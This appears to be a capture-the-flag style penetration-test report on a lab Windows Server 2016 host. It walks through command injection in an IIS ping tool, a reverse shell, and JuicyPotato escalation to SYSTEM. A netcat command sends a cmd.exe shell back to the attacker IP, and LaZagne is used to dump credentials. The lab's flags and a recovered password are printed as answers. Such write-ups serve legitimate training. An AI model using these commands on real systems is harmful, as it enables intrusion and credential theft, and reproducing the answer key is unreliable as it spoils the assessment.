# Windows Privilege Escalation Skills Assessment — Part I

**INLANEFREIGHT | Technical Penetration Testing Report**

## Target Information

| Item | Value |
|---|---|
| Target | `10.129.185.55` |
| Hostname | `WINLPE-SKILLS1-SRV` |
| Platform | Windows Server 2016 Standard x64 |
| Assessment | Windows Privilege Escalation Skills Assessment — Part I |

---

## 1. Executive Summary

The assessment targeted the non-domain-joined Windows server `10.129.185.55`.

Initial network enumeration identified:

- TCP/80 — Microsoft IIS 10.0
- TCP/3389 — Microsoft Terminal Services/RDP

The IIS application, **DEV Connection Tester**, was vulnerable to operating-system command injection. The vulnerability allowed arbitrary commands to execute as:

```text
IIS APPPOOL\DefaultAppPool
```

A PowerShell reverse shell was obtained from this foothold.

Local enumeration identified the following important privilege:

```text
SeImpersonatePrivilege    Enabled
```

JuicyPotato was then used with a working Windows Server 2016 CLSID to create a process as:

```text
NT AUTHORITY\SYSTEM
```

An interactive SYSTEM shell was established using Netcat.

From the SYSTEM context, LaZagne recovered an Apache Directory Studio LDAP credential for the `ldapadmin` account. The Administrator Desktop flag and `confidential.txt` were subsequently retrieved.

All four assessment objectives were completed.

---

# 2. Assessment Objectives

The assessment required the following:

1. Identify the two installed KBs.
2. Find the password for the `ldapadmin` account.
3. Escalate privileges to `NT AUTHORITY\SYSTEM` and retrieve `flag.txt`.
4. Locate `confidential.txt` and retrieve its contents.

---

# 3. Network Enumeration

## 3.1 Nmap Scan

The assessment began with:

```bash
nmap -Pn -sC -sV 10.129.185.55
```

### Results

| Port | State | Service | Details |
|---|---|---|---|
| `80/tcp` | Open | HTTP | Microsoft IIS 10.0; DEV Connection Tester |
| `3389/tcp` | Open | RDP | Microsoft Terminal Services; target WINLPE-SKILLS1-SRV |

RDP enumeration identified:

```text
Target Name: WINLPE-SKILLS1-
DNS Name: WINLPE-SKILLS1-SRV
Product Version: 10.0.14393
```

The host was identified as Windows Server 2016.

---

# 4. Web Application Enumeration

The HTTP service exposed an application named:

```text
DEV Connection Tester
```

The application accepted a host/address input and provided a **Ping host** function.

## 4.1 Command Injection Validation

The following input was supplied:

```text
127.0.0.1&whoami
```

The application returned:

```text
IIS APPPOOL\DefaultAppPool
```

This confirmed command injection.

A second validation was performed with:

```text
127.0.0.1&ipconfig
```

The target's network configuration showed:

```text
IPv4 Address: 10.129.185.55
Subnet Mask: 255.255.0.0
Default Gateway: 10.129.0.1
```

The underlying ASP.NET application constructed a `cmd.exe` ping command using attacker-controlled input. This allowed additional operating-system commands to be executed.

---

# 5. Initial Access — Reverse Shell

The command injection was used to launch a PowerShell TCP reverse shell.

The Kali attacker interface used for the final assessment was:

```text
10.10.16.68
```

The listener was:

```bash
nc -lvnp 4444
```

The PowerShell payload connected back to Kali and produced:

```text
PS C:\windows\system32\inetsrv>
```

The initial identity was:

```powershell
whoami
```

Result:

```text
IIS APPPOOL\DefaultAppPool
```

---

# 6. Local Enumeration

## 6.1 Privilege Enumeration

The following command was executed:

```powershell
whoami /priv
```

The important privilege was:

```text
SeImpersonatePrivilege    Enabled
```

Other observed privileges included:

```text
SeAssignPrimaryTokenPrivilege Disabled
SeIncreaseQuotaPrivilege       Disabled
SeAuditPrivilege               Disabled
SeChangeNotifyPrivilege        Enabled
SeImpersonatePrivilege         Enabled
SeCreateGlobalPrivilege        Enabled
SeIncreaseWorkingSetPrivilege  Disabled
```

`SeImpersonatePrivilege` was the key condition used for the privilege-escalation path.

---

## 6.2 System Information

System information showed:

```text
Windows Server 2016 Standard
Version: 10.0.14393
Architecture: x64
```

---

# 7. Q1 — Installed KBs

Patch enumeration was performed with:

```powershell
wmic qfe get HotFixID
```

The target reported:

```text
KB3199986
KB3200970
```

### Q1 Answer

```text
KB3199986&KB3200970
```

---

# 8. Service and Configuration Enumeration

Several possible privilege-escalation avenues were reviewed.

The Windows Print Spooler was running as LocalSystem.

Third-party services inspected included:

- Mozilla Maintenance Service
- VMware VMTools

No useful writable third-party service binary was identified through this path.

Apache Directory Studio was also installed:

```text
C:\Program Files\Apache Directory Studio
```

Initial searches of:

- Apache Directory Studio installation files
- Common workspace locations
- Configuration files
- Registry locations
- LDAP-related strings

did not directly reveal the `ldapadmin` credential.

The credential was later recovered successfully with LaZagne after obtaining SYSTEM access.

---

# 9. Tool Transfer

The assessment tools were transferred to the Windows target using a Python HTTP server and `certutil`.

Tools used:

```text
JuicyPotato.exe
LaZagne.exe
nc.exe
```

The Kali HTTP server was started with:

```bash
cd ~/Downloads/cyber
python3 -m http.server 8000
```

The target's Kali IP was:

```text
10.10.16.68
```

JuicyPotato was stored at:

```text
C:\Windows\Temp\JuicyPotato.exe
```

LaZagne was stored at:

```text
C:\Windows\Temp\LaZagne.exe
```

Netcat was stored at:

```text
C:\Users\Public\nc.exe
```

---

# 10. Q2 — ldapadmin Credential

LaZagne was executed from the SYSTEM context:

```cmd
C:\Windows\Temp\LaZagne.exe all
```

LaZagne reported an Apache Directory Studio credential.

### Recovered Credential

| Field | Value |
|---|---|
| Host | `dc01.inlanefreight.local` |
| Port | `389` |
| Login | `ldapadmin` |
| Password | `car3ful_st0rinG_cr3d$` |
| Authentication | `SIMPLE` |

The `ldapadmin` credential was not a local Windows account credential, matching the assessment hint.

### Q2 Answer

```text
car3ful_st0rinG_cr3d$
```

---

# 11. Q3 — Privilege Escalation

Because `SeImpersonatePrivilege` was enabled, JuicyPotato was used.

The working CLSID was:

```text
{C49E32C6-BC8B-11D2-85D4-00105A1F8304}
```

## 11.1 JuicyPotato Validation

Command:

```powershell
C:\Windows\Temp\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t * -c "{C49E32C6-BC8B-11D2-85D4-00105A1F8304}"
```

Successful output:

```text
[+] authresult 0
{C49E32C6-BC8B-11D2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

This confirmed successful SYSTEM token impersonation.

---

# 12. SYSTEM Reverse Shell

A Netcat listener was started on Kali:

```bash
nc -lvnp 4141
```

The JuicyPotato command was then used to launch Netcat from the SYSTEM process:

```powershell
C:\Windows\Temp\JuicyPotato.exe -l 4141 -c "{C49E32C6-BC8B-11D2-85D4-00105A1F8304}" -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe 10.10.16.68 4141" -t *
```

The resulting shell was verified with:

```cmd
whoami
```

Result:

```text
nt authority\system
```

---

# 13. Q3 Flag Retrieval

From the SYSTEM shell:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

Output:

```text
Ev3ry_sysadm1ns_n1ghtMare!
```

### Q3 Answer

```text
Ev3ry_sysadm1ns_n1ghtMare!
```

---

# 14. Q4 — Locate confidential.txt

The file was searched for recursively:

```cmd
where /R C:\ confidential.txt
```

The search returned:

```text
C:\Documents and Settings\Administrator\Documents\My Music\confidential.txt
C:\Documents and Settings\Administrator\Music\confidential.txt
C:\Documents and Settings\Administrator\My Documents\My Music\confidential.txt
C:\Users\Administrator\Documents\My Music\confidential.txt
C:\Users\Administrator\Music\confidential.txt
C:\Users\Administrator\My Documents\My Music\confidential.txt
```

The normal Administrator Music path was selected:

```text
C:\Users\Administrator\Music\confidential.txt
```

The file was read with:

```cmd
type "C:\Users\Administrator\Music\confidential.txt"
```

Contents:

```text
5e5a7dafa79d923de3340e146318c31a
```

### Q4 Answer

```text
5e5a7dafa79d923de3340e146318c31a
```

---

# 15. Complete Attack Chain

The complete compromise path was:

```text
10.129.185.55
        |
        v
TCP/80 - IIS / DEV Connection Tester
        |
        v
Command Injection
        |
        v
IIS APPPOOL\DefaultAppPool
        |
        v
PowerShell Reverse Shell
        |
        v
SeImpersonatePrivilege
        |
        v
JuicyPotato
        |
        v
NT AUTHORITY\SYSTEM
        |
        +----------------------+
        |                      |
        v                      v
     LaZagne              Administrator
        |                  Desktop flag
        v
 ldapadmin credential
        |
        v
 confidential.txt
```

---

# 16. Security Findings

## Finding 1 — OS Command Injection

**Severity: Critical**

The DEV Connection Tester application incorporated user-controlled input into a `cmd.exe` command.

Evidence:

```text
127.0.0.1&whoami
```

Result:

```text
IIS APPPOOL\DefaultAppPool
```

### Impact

An attacker able to reach the application could execute arbitrary commands under the IIS application identity and establish an initial foothold.

### Recommendation

- Remove shell-based command construction.
- Use safe process APIs.
- Strictly allow-list valid host/IP input.
- Never concatenate untrusted input into operating-system commands.
- Validate and canonicalize input before processing.

---

## Finding 2 — SeImpersonatePrivilege Exposed to IIS Application Identity

**Severity: Critical**

The IIS application identity had:

```text
SeImpersonatePrivilege Enabled
```

This allowed the JuicyPotato escalation path to create a SYSTEM process.

### Impact

A web application compromise could be escalated from an IIS application identity to full SYSTEM privileges.

### Recommendation

- Review the privileges assigned to IIS application pools.
- Remove unnecessary privileges.
- Run applications under the least-privileged identity possible.
- Isolate applications that require special privileges.
- Monitor for token impersonation and suspicious SYSTEM process creation.

---

## Finding 3 — Recoverable LDAP Credential

**Severity: High**

LaZagne recovered:

```text
ldapadmin
car3ful_st0rinG_cr3d$
```

from Apache Directory Studio data.

### Impact

An attacker with sufficient local access could recover a reusable LDAP credential and potentially use it for further access depending on the account's permissions.

### Recommendation

- Rotate the exposed credential.
- Avoid storing reusable passwords in client application configuration.
- Use secure credential stores.
- Use least-privileged LDAP accounts.
- Review the permissions of `ldapadmin`.
- Prefer stronger authentication mechanisms where supported.

---

## Finding 4 — Sensitive Data Accessible After SYSTEM Compromise

**Severity: High**

SYSTEM access allowed retrieval of:

```text
C:\Users\Administrator\Desktop\flag.txt
```

and:

```text
C:\Users\Administrator\Music\confidential.txt
```

### Recommendation

- Minimize sensitive data stored locally.
- Apply appropriate NTFS permissions.
- Protect administrative profile data.
- Review legacy/redirected profile locations.
- Monitor access to sensitive files.

---

# 17. Remediation Recommendations

1. Fix the command-injection vulnerability in DEV Connection Tester.
2. Eliminate unsafe shell invocation where possible.
3. Apply strict allow-list validation to network-address input.
4. Review IIS application-pool privileges.
5. Remove unnecessary `SeImpersonatePrivilege`.
6. Maintain a current Windows security baseline and patch-management process.
7. Rotate the exposed `ldapadmin` password.
8. Review and reduce LDAP account permissions.
9. Avoid storing reusable credentials in application configuration.
10. Restrict unnecessary outbound connections from web servers.
11. Monitor IIS worker processes for unexpected:
    - `cmd.exe`
    - `powershell.exe`
    - `certutil.exe`
    - `nc.exe`
12. Monitor suspicious SYSTEM process creation originating from application identities.
13. Minimize sensitive data stored in Administrator profiles.
14. Review file permissions and legacy profile paths.
15. Establish detection rules for token impersonation and privilege-escalation behavior.

---

# 18. Evidence / Command Reference

| Purpose | Command |
|---|---|
| Network enumeration | `nmap -Pn -sC -sV 10.129.185.55` |
| Command injection | `127.0.0.1&whoami` |
| Identity | `whoami` |
| Privilege enumeration | `whoami /priv` |
| Patch enumeration | `wmic qfe get HotFixID` |
| Credential discovery | `C:\Windows\Temp\LaZagne.exe all` |
| JuicyPotato escalation | `JuicyPotato.exe` with the working CLSID |
| SYSTEM verification | `whoami` |
| Q3 flag | `type C:\Users\Administrator\Desktop\flag.txt` |
| Q4 discovery | `where /R C:\ confidential.txt` |
| Q4 contents | `type "C:\Users\Administrator\Music\confidential.txt"` |

---

# 19. Final Assessment Answers

| Question | Answer |
|---|---|
| **Q1 — Which two KBs are installed?** | `KB3199986&KB3200970` |
| **Q2 — Password for ldapadmin** | `car3ful_st0rinG_cr3d$` |
| **Q3 — flag.txt** | `Ev3ry_sysadm1ns_n1ghtMare!` |
| **Q4 — confidential.txt** | `5e5a7dafa79d923de3340e146318c31a` |

---

# 20. Conclusion

The assessment demonstrated a complete compromise chain beginning with a web-layer command-injection vulnerability and ending in SYSTEM-level access.

The major escalation condition was `SeImpersonatePrivilege` on the IIS application identity. JuicyPotato successfully leveraged this privilege to create a process as `NT AUTHORITY\SYSTEM`, after which an interactive SYSTEM shell was established.

The elevated context enabled recovery of the `ldapadmin` LDAP credential from Apache Directory Studio data and access to protected Administrator-profile files.

All four assessment questions were successfully completed.
